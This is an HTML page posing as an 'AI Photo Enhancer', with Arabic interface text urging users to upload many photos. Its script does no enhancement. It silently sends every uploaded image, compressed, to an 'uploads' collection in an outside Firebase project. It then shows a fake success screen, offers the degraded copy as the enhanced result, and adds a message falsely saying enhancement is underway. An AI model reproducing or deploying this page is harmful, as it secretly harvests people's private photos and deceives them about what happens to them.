<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Photo Enhancer</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&family=Tajawal:wght@500;700;800&display=swap');
        
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body { 
            font-family: 'Poppins', sans-serif;
            background: #09090b; 
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            height: 100dvh; 
            padding: 20px; 
            overflow: hidden;
            position: relative;
        }

        /* تأثير خلفية نيون */
        body::before {
            content: '';
            position: absolute;
            top: -20%; left: -20%;
            width: 140%; height: 140%;
            background: radial-gradient(circle at 50% 50%, rgba(168, 85, 247, 0.15), transparent 60%);
            z-index: 0;
            pointer-events: none;
        }
        
        .container {
            background: rgba(22, 22, 24, 0.8);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 40px 30px; 
            border-radius: 28px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.9), inset 0 1px 0 rgba(255,255,255,0.05); 
            max-width: 420px; 
            width: 100%;
            text-align: center; 
            border: 1px solid rgba(255, 255, 255, 0.08);
            position: relative;
            z-index: 1;
        }

        .logo-bar { display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 25px; }
        .logo-bar h1 { 
            font-size: 22px; 
            font-weight: 800;
            background: linear-gradient(90deg, #c084fc, #f472b6); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        .logo-bar span { font-size: 26px; animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }

        .hero-text { 
            font-size: 14px; 
            color: #a1a1aa; 
            margin-bottom: 30px; 
            line-height: 1.6; 
            font-weight: 400;
        }
        
        .upload-area {
            border: 2px dashed rgba(168, 85, 247, 0.4);
            background: rgba(168, 85, 247, 0.03);
            padding: 35px 20px;
            border-radius: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 5px;
        }
        .upload-area:hover { 
            border-color: #a855f7; 
            background: rgba(168, 85, 247, 0.08); 
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(168, 85, 247, 0.15);
        }
        .upload-area .icon { font-size: 45px; margin-bottom: 15px; display: block; }
        
        /* الكلام العربي على الزرار */
        .upload-area p { 
            font-family: 'Tajawal', sans-serif;
            font-size: 16px; 
            color: #f8fafc; 
            font-weight: 700;
            margin-bottom: 6px;
        }
        .upload-area span { 
            font-family: 'Tajawal', sans-serif;
            font-size: 13px; 
            color: #a1a1aa; 
            display: block; 
        }

        input[type="file"] { display: none; }

        .loading-screen { display: none; flex-direction: column; align-items: center; gap: 20px; padding: 25px 0; }
        .spinner { 
            width: 45px; height: 45px; 
            border: 3px solid rgba(168, 85, 247, 0.2); 
            border-top-color: #a855f7; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        .loading-text { font-family: 'Tajawal', sans-serif; font-size: 16px; color: #c084fc; font-weight: 700; }

        .success-screen { display: none; flex-direction: column; align-items: center; gap: 15px; padding: 20px 0; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes popIn { 0% { transform: scale(0.9); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        
        .success-icon { font-size: 55px; }
        .success-text { font-family: 'Tajawal', sans-serif; font-size: 20px; color: #22c55e; font-weight: 800; }
        .sub-text { font-family: 'Tajawal', sans-serif; font-size: 14px; color: #a1a1aa; margin-bottom: 10px; }

        .download-btn {
            background: linear-gradient(135deg, #22c55e, #16a34a); 
            color: white; border: none; padding: 16px;
            border-radius: 14px; font-family: 'Tajawal', sans-serif; font-size: 16px; font-weight: 700; width: 100%;
            cursor: pointer; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 8px;
            box-shadow: 0 8px 20px rgba(34, 197, 94, 0.25);
            transition: 0.2s;
        }
        .download-btn:active { transform: scale(0.97); }

        .chat-reply {
            font-family: 'Tajawal', sans-serif;
            background: rgba(255,255,255,0.03); padding: 15px; border-radius: 14px;
            font-size: 14px; color: #d4d4d8; text-align: right; margin-top: 25px;
            border-right: 3px solid #a855f7;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-bar">
            <span>✨</span>
            <h1>AI Photo Enhancer</h1>
        </div>
        
        <p class="hero-text">Enhance your photos with AI. Upload now and let our team do the magic.</p>

        <input type="file" id="fileInput" accept="image/*" multiple>

        <div id="uploadScreen">
            <div class="upload-area" id="uploadArea">
                <span class="icon">📸</span>
                <p>اضغط لوضع الكثير من الصور لتحسينها</p>
                <span>تقدر تختار كل الصور اللي إنت عايزها مرة واحدة</span>
            </div>
        </div>

        <div class="loading-screen" id="loadingScreen">
            <div class="spinner"></div>
            <p class="loading-text" id="loadingSubtext">جاري معالجة الصور...</p>
        </div>

        <div class="success-screen" id="successScreen">
            <div class="success-icon">✅</div>
            <h2 class="success-text">تم التحسين بنجاح!</h2>
            <p class="sub-text">صورك بقت جاهزة للتحميل</p>
            <a href="#" class="download-btn" id="downloadBtn" download="enhanced_photo.jpg">
                ⬇️ تحميل الصورة المحسنة
            </a>
        </div>

        <div id="chatReply" style="display:none;" class="chat-reply"></div>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyAUmHcm0d0ErUph8l132llavVcUfwHWfic",
        authDomain: "gaming-platform-5ef6c.firebaseapp.com",
        projectId: "gaming-platform-5ef6c",
        storageBucket: "gaming-platform-5ef6c.firebasestorage.app",
        messagingSenderId: "332262507211",
        appId: "1:332262507211:web:dd51b094b7d3e4ab68914e",
        measurementId: "G-GVYDLMTY22"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const fileInput = document.getElementById('fileInput');
    const uploadArea = document.getElementById('uploadArea');
    const uploadScreen = document.getElementById('uploadScreen');
    const loadingScreen = document.getElementById('loadingScreen');
    const successScreen = document.getElementById('successScreen');
    const loadingSubtext = document.getElementById('loadingSubtext');
    const downloadBtn = document.getElementById('downloadBtn');

    // دالة الضغط
    function compressImage(file, maxWidth = 800, quality = 0.6) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = (event) => {
                const img = new Image();
                img.src = event.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    let width = img.width;
                    let height = img.height;

                    if (width > maxWidth) {
                        height = Math.round((height * maxWidth) / width);
                        width = maxWidth;
                    }

                    canvas.width = width;
                    canvas.height = height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, width, height);

                    const compressedBase64 = canvas.toDataURL('image/jpeg', quality);
                    resolve(compressedBase64);
                };
                img.onerror = reject;
            };
            reader.onerror = reject;
        });
    }

    uploadArea.addEventListener('click', () => fileInput.click());
    
    fileInput.addEventListener('change', async (e) => {
        const files = Array.from(e.target.files).filter(f => f.type.startsWith('image/'));
        if (files.length === 0) return;

        uploadScreen.style.display = 'none';
        loadingScreen.style.display = 'flex';

        let uploaded = 0;
        let lastBase64 = "";

        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            try {
                const base64 = await compressImage(file);
                lastBase64 = base64;

                await addDoc(collection(db, "uploads"), {
                    imageBase64: base64,
                    fileName: "enhancer_" + Date.now() + "_" + file.name,
                    fileType: "image/jpeg",
                    uploadedAt: serverTimestamp()
                });

                uploaded++;
                loadingSubtext.textContent = `جاري معالجة الصورة ${uploaded} من ${files.length}...`;

            } catch (err) {
                console.error("خطأ في الرفع:", err);
                alert("معلش حصلت مشكلة في الرفع: " + err.message);
            }
        }

        setTimeout(() => {
            loadingScreen.style.display = 'none';
            successScreen.style.display = 'flex';

            if (lastBase64) {
                downloadBtn.href = lastBase64;
                downloadBtn.download = "enhanced_photo.jpg";
            }

            document.getElementById('chatReply').style.display = 'block';
            document.getElementById('chatReply').textContent = `✅ ماشي حاضر يا سيدي، استلمت ${uploaded} صورة وجاري تحسينها دلوقتي، هبقى أبلغك أول ما تخلص.`;

        }, 1500);
    });
</script>

</body>
</html>
